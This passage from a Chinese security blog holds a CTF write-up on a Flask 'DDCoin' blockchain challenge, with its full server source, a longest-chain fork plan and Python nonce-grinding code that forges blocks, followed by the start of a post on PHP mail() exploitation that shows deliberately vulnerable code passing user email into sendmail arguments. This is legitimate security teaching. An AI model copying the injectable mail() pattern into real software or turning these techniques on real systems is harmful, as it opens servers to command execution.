DDCoins ...</span></span><br><span class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</span><br><span class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></span><br><span class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</span><br><span class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</span><br><span class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></span><br><span class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</span><br><span class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</span><br><span class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</span><br><span class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</span><br><span class="line">        append_block(second_block)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></span><br><span class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</span><br><span class="line">        append_block(third_block)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    tail = find_blockchain_tail()</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line">    balance, utxos, _ = get_balance_of_all()</span><br><span class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</span><br><span class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</span><br><span class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</span><br><span class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</span><br><span class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></span><br><span class="line">    collected = []</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</span><br><span class="line">            amount -= utxo[<span class="string">'amount'</span>]</span><br><span class="line">            collected.append(utxo[<span class="string">'id'</span>])</span><br><span class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></span><br><span class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</span><br><span class="line">    outputs = [create_output_utxo(addr_to, amount)]</span><br><span class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</span><br><span class="line">        outputs.append(create_output_utxo(addr_from, the_change))</span><br><span class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        address = str(address)</span><br><span class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></span><br><span class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</span><br><span class="line"></span><br><span class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</span><br><span class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        block = json.loads(request.data)</span><br><span class="line">        append_block(block, DIFFICULTY)</span><br><span class="line">        msg = <span class="string">'transaction finished.'</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">        </span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</span><br><span class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></span><br><span class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        msg += <span class="string">' You receive a diamond.'</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></span><br><span class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">    source.close()</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="区块链简介"><a href="#区块链简介" class="headerlink" title="#区块链简介"></a><strong>#区块链简介</strong></h3><p><strong>概念</strong>：区块链本质上是一个去中心化的、分布式的数据库。在区块链中没有中心节点，每个节点都保存了整个数据库。所有的节点会同步，保证区块链的一致。<br><strong>作用</strong>：存储信息。<br><strong>区块</strong>：每个区块由区块头和区块体组成。区块头记录了当前区块的特征值，区块体记录了实际的数据。区块包含的交易附加在区块体中。<br><strong>工作量证明</strong>：工作方需要做一定的难度的工作得出一个结果，而验证方很容易能通过结果来检查工作方是否做了相应的工作。区块头包含了一个随机数，通过不停变换随机数，对block作hash，计算出一个符合目标难度的hash值时，工作量证明完成。<br><strong>目标难度</strong>：目标值是一个前n位为0，后64-n位为F的64位16进制数。只要计算出的hash值小于目标值即可。</p>
<hr>
<h3 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="#代码逻辑分析"></a><strong>#代码逻辑分析</strong></h3><p>源代码基于flask框架实现了一个简单区块链的功能。<br>分析路由得到网站功能如下：</p>
<ul>
<li><code>/</code>；主页，homepage（）；显示了初始化之后的区块链信息，包括创世区块hash、交易记录、所有区块信息等。</li>
<li><code>/flag</code>；getFlag()判断session中若有2个diamonds则给flag。</li>
<li><code>/create_transaction</code>；create_tx_and_check_shop_balance()方法接受用户传送的json数据并且将其中的数据作为一个block，作为append_block的参数将新block添加至区块链。</li>
<li><code>/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;</code>；</li>
<li><code>/reset</code>；重置整个区块链。</li>
</ul>
<p>区块链初始化由函数init()实现，在创世区块中，银行获得了1000000个DDcoin，第二个区块中黑客拿走999999个，银行剩余1个，第三个区块是个空区块。</p>
<p>一个block的格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &apos;nonce&apos;: &apos;HAHA, I AM THE BANK NOW!&apos;,</span><br><span class="line"> &apos;prev&apos;: &apos;7089ad47871713d20971eb51a0ed614cee08d6b444f0077e56a1b4d591d810e5&apos;,</span><br><span class="line"> &apos;hash&apos;: &apos;f0c8052d2ead4bd2afea32eaeb11d5e423970b1d6d1331fe512efe9c8930819d&apos;,</span><br><span class="line"> &apos;transactions&apos;: </span><br><span class="line">    [&#123;</span><br><span class="line">    &apos;input&apos;: [&apos;1b4dd52e-b4c3-4eb6-b504-871325b775a0&apos;], </span><br><span class="line">    &apos;output&apos;:[</span><br><span class="line">            &#123;</span><br><span class="line">            &apos;amount&apos;: 999999, </span><br><span class="line">            &apos;hash&apos;: &apos;fbe371ae0dbeb8d80168451369f84958e63faa52f4a9a9dc2c2281871431d4dd&apos;, </span><br><span class="line">            &apos;id&apos;: &apos;05c6e023-5f45-4c61-b412-1edddb73342d&apos;, </span><br><span class="line">            &apos;addr&apos;: &apos;a993a25014b2c99a04c4ff2d0b5a208b28b77f19af1718513eeeda95c5620d3ea7a23f886ea96cf32bad0d3a869add77&apos;</span><br><span class="line">            &#125;, </span><br><span class="line">            &#123;</span><br><span class="line">            &apos;amount&apos;: 1, </span><br><span class="line">            &apos;hash&apos;: &apos;47fe754bb495980fe08a2ddca3f3ff4a53f8cb2465eff01d7e6cbd222a2fd473&apos;, </span><br><span class="line">            &apos;id&apos;: &apos;a4b643e9-3410-45a4-bec1-40d700ae7add&apos;, </span><br><span class="line">            &apos;addr&apos;: &apos;862b7000363f60b516b701d1e5f4bb131c222a46574f70e2c7401884d24cbd4b4d709b626eb09af4c4affa6497eae155&apos;</span><br><span class="line">            &#125;</span><br><span class="line">            ],</span><br><span class="line">    &apos;hash&apos;: &apos;a66f760162c95cde33a6c9892623e31a5e1a379e99a23407e3db010022485e3f&apos;,  </span><br><span class="line">    &apos;signature&apos;: [&apos;56c83cde1028ab556e96284c854108ff6874de4b81ee3ef3a017af530e05adfb8e174b3ba883ca68a59fd3e451c101b9&apos;]</span><br><span class="line">    &#125;]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="几个重要的方法"><a href="#几个重要的方法" class="headerlink" title="几个重要的方法"></a><strong>几个重要的方法</strong></h4><p><code>append_block(block, difficulty)</code><br>该方法判断传入的block是否具有相应属性、属性的值是否符合要求的格式、账单的入和出是否平衡（这里参考utxo）、block的hash值是否符合比设定的难度目标值小，根据判断的结果将符合要求的block增加至prev hash指向的块之后。</p>
<h4 id="有效链的判断"><a href="#有效链的判断" class="headerlink" title="有效链的判断"></a><strong>有效链的判断</strong></h4><p>在/create_transaction中的<code>create_tx_and_check_shop_balance()</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">balance, utxos, tail = get_balance_of_all()</span><br></pre></td></tr></table></figure></p>
<p>查看<code>get_balance_of_all()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    tail = find_blockchain_tail()<span class="comment"># 找到height最大的block块的value，即最长链的尾端</span></span><br><span class="line">    utxos = calculate_utxo(tail)<span class="comment"># 从最长链的尾端反向获取最长区块链分支中的utxo</span></span><br><span class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</span><br></pre></td></tr></table></figure></p>
<p>可以得出在这个区块链中，<strong>最长链会被判断为有效链</strong>。</p>
<h3 id="51-攻击"><a href="#51-攻击" class="headerlink" title="#51%攻击"></a><strong>#51%攻击</strong></h3><p>系统认为节点多的版本是有效的版本。当攻击者拥有了超过全网51%的算力，就有可能比其他人更快算出下一个节点，便有可能使用伪造的节点来替代真实的节点。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="#思路"></a><strong>#思路</strong></h3><p>根据代码的要求，每当shop_address有1000000DDcoin则，代码会自动将1000000DDcoin转到shop_wallet_address，然后获得一个diamond，diamond的数量保存在session中。因此为了达到题目要求，需要往shop_address转移两次1000000。<br>初始化之后的区块链：<br><code>[创世区块，银行得到1000000]</code>–&gt;<code>[区块2，黑客得到999999，银行剩余1]</code>–&gt;<code>[区块3，空区块]</code><br><strong>1.</strong>以创世区块为首新建一个比原先更长的分支2。此时由于分支2为最长链，因此代替了原来的链成为了有效链。<br><code>[创世区块，银行得到1000000]</code>–&gt;<code>[区块2，给shop_address1000000]</code>–&gt;<code>[区块3，空区块]</code>–&gt;<code>[区块4，空区块]</code><br><strong>2.</strong>根据分支2计算utxo判断shop_address有1000000，将1000000DDcoin转到shop_wallet_address，获得一个diamond。<br><code>[创世区块，银行得到1000000]</code>–&gt;<code>[区块2，给shop_address1000000]</code>–&gt;<code>[区块3，空区块]</code>–&gt;<code>[区块4，空区块]</code>–&gt;<code>[区块5，给shop_wallet_address1000000]</code><br><strong>3.</strong>为了再次给shop_address1000000，接在分支2的区块4后面创建更长的区块链。<br><code>[创世区块，银行得到1000000]</code>–&gt;<code>[区块2，给shop_address1000000]</code>–&gt;<code>[区块3，空区块]</code>–&gt;<code>[区块4，空区块]</code>–&gt;<code>[区块5，空区块]</code>–&gt;<code>[区块6，空区块]</code></p>
<h3 id="构造block"><a href="#构造block" class="headerlink" title="#构造block"></a><strong>#构造block</strong></h3><p>有交易的block结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.前一块hash</span><br><span class="line">2.随机数nonce</span><br><span class="line">3.transactions</span><br><span class="line">4.block height ：本块是区块链中的第几块（创世块height为0）</span><br><span class="line">4.本块hash</span><br></pre></td></tr></table></figure></p>
<p>transactions构成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handout = create_output_utxo(hacker_address, 999999)</span><br><span class="line">reserved = create_output_utxo(bank_address, 1)</span><br><span class="line">transferred = create_tx([total_currency_issued[&apos;id&apos;]], [handout, reserved], bank_privkey)</span><br></pre></td></tr></table></figure></p>
<p>create_tx（input_utxo_ids, output_utxo, privkey_from）方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def create_tx(input_utxo_ids, output_utxo, privkey_from=None):</span><br><span class="line">    tx = &#123;&apos;input&apos;: input_utxo_ids, &apos;signature&apos;: [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], &apos;output&apos;: output_utxo&#125;</span><br><span class="line">    tx[&apos;hash&apos;] = hash_tx(tx)</span><br><span class="line">    return tx</span><br></pre></td></tr></table></figure></p>
<p>create_output_utxo（）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def create_output_utxo(addr_to, amount):</span><br><span class="line">    utxo = &#123;&apos;id&apos;: str(uuid.uuid4()), &apos;addr&apos;: addr_to, &apos;amount&apos;: amount&#125;</span><br><span class="line">    utxo[&apos;hash&apos;] = hash_utxo(utxo)</span><br><span class="line">    return utxo</span><br></pre></td></tr></table></figure></p>
<p>综上，可得出transaction的格式，其中id可以自己构造，而signature由于在append_block过程中不会被用到，因此可以直接使用已有的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tx=&#123;</span><br><span class="line">    &apos;input&apos;:id,</span><br><span class="line">    &apos;signature&apos;:signatures,</span><br><span class="line">    &apos;output&apos;:&#123;</span><br><span class="line">            [handout]</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">handout=&#123;</span><br><span class="line">        &apos;id&apos;:id,</span><br><span class="line">        &apos;addr&apos;:addr,</span><br><span class="line">        &apos;amount&apos;:amount,</span><br><span class="line">        &apos;hash&apos;:hash</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>根据源代码，可以得到目标难度的值。通过调用源代码中计算hash的方法不断计算block的hash值，可以得到一个小于目标难度的hash，构造出符合要求的block。</p>
<hr>
<h3 id="计算block的代码"><a href="#计算block的代码" class="headerlink" title="#计算block的代码"></a><strong>#计算block的代码</strong></h3><p>构造一个具有transaction的block，例如block2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msg=<span class="string">'im b1acktea'</span></span><br><span class="line">handout2=&#123;</span><br><span class="line">        <span class="string">'id'</span>:str(uuid.uuid4()),</span><br><span class="line">        <span class="string">'addr'</span>:shop_addr,</span><br><span class="line">        <span class="string">'amount'</span>:<span class="number">1000000</span>,</span><br><span class="line">        &#125;</span><br><span class="line">handout2[<span class="string">'hash'</span>]=blockchains.hash_utxo(handout2)</span><br><span class="line">b2_tx=&#123;<span class="string">'input'</span>:[genesis_id],<span class="string">'signature'</span>:[signatures],<span class="string">'output'</span>:[handout2]&#125;</span><br><span class="line">b2_tx[<span class="string">'hash'</span>]=blockchains.hash_tx(b2_tx)</span><br><span class="line">block2=&#123;&#125;</span><br><span class="line">block2[<span class="string">'prev'</span>]=genesis_hash</span><br><span class="line">block2[<span class="string">'transactions'</span>]=[b2_tx]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    block2[<span class="string">'nonce'</span>]=msg+str(i)</span><br><span class="line">    block2[<span class="string">'hash'</span>]=blockchains.hash_block(block2)</span><br><span class="line">    bc2hash=int(block2[<span class="string">'hash'</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#print block2['hash']</span></span><br><span class="line">    <span class="keyword">if</span> bc2hash&lt;DIFFICULTY:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"-------------------block2---------------------"</span></span><br><span class="line">        <span class="keyword">print</span> block2</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>构造一个空block<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#block3 empty</span></span><br><span class="line">block3=&#123;&#125;</span><br><span class="line">block3[<span class="string">'prev'</span>]=block2[<span class="string">'hash'</span>]</span><br><span class="line">block3[<span class="string">'transactions'</span>]=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    block3[<span class="string">'nonce'</span>]=msg+str(i)</span><br><span class="line">    block3[<span class="string">'hash'</span>]=blockchains.hash_block(block3)</span><br><span class="line">    bc3hash=int(block3[<span class="string">'hash'</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#print block2['hash']</span></span><br><span class="line">    <span class="keyword">if</span> bc3hash&lt;DIFFICULTY:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"-------------------block3---------------------"</span></span><br><span class="line">        <span class="keyword">print</span> block3</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/22/article1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="b1acktea">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="b1acktea's">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/22/article1/" itemprop="url">PHP mail函数漏洞利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:05:40+08:00">
                2018-01-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web/" itemprop="url" rel="index">
                    <span itemprop="name">Web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>利用mail函数可以使攻击者达到远程代码执行权限以及其他恶意目的。</p>
</blockquote>
<h3 id="0x00获取源码"><a href="#0x00获取源码" class="headerlink" title="0x00获取源码"></a>0x00获取源码</h3><p>第一步访问/.index.php.swp源码找到泄露的源码，主要功能代码大致如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $email = isset($_POST[&apos;email&apos;])?trim($_POST[&apos;email&apos;]):&apos;&apos;;</span><br><span class="line">    $title = isset($_POST[&apos;title&apos;])?trim($_POST[&apos;title&apos;]):&apos;&apos;;</span><br><span class="line">    $content = isset($_POST[&apos;content&apos;])?trim($_POST[&apos;content&apos;]):&apos;&apos;;</span><br><span class="line">    if(chkEmail($email) &amp;&amp; chkTitle($title) &amp;&amp; chkContent($content))&#123;</span><br><span class="line">        $to = &apos;ambulong@vulnspy.com&apos;;</span><br><span class="line">        $subject = &quot;收到来自 &#123;$email&#125; 的留言&quot;;</span><br><span class="line">        $msg = &quot;&#123;$title&#125;\n&#123;$content&#125;\nFrom: &#123;$email&#125;&quot;;</span><br><span class="line">        $headers = &apos;From: &apos; . $email . &quot;\r\n&quot; .</span><br><span class="line">            &apos;Reply-To: &apos; . $email . &quot;\r\n&quot; .</span><br><span class="line">            &apos;X-Mailer: PHP/&apos; . phpversion();</span><br><span class="line">        $options = sprintf(&apos;-f%s&apos;, $email);</span><br><span class="line">        if(mail($to, $subject, $msg, $headers, $options))&#123;</span><br><span class="line">            echo &quot;发送成功&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;发送失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x01mail函数分析"><a href="#0x01mail函数分析" class="headerlink" title="0x01mail函数分析"></a>0x01mail函数分析</h3><h5 id="mail函数"><a href="#mail函数" class="headerlink" title="mail函数"></a>mail函数</h5><p>mail函数用于从PHP应用程序发送电子邮件，包括五个参数。<br><figure class="highlight plain"><figcaption><span>mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其参数描述如下：</span><br><span class="line"></span><br><span class="line">|参数名                  |  描述     |</span><br><span class="line">|---------------|-------------------|</span><br><span class="line">|to                    |  邮件的接收者     |</span><br><span class="line">|subject |邮件的主题|</span><br><span class="line">|message |发送的消息|</span><br><span class="line">|headers |额外的报头|</span><br><span class="line">|parameters | 程序的额外参数|</span><br><span class="line"></span><br><span class="line">其中第五个参数的描述为：</span><br><span class="line">&gt;The additional_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this 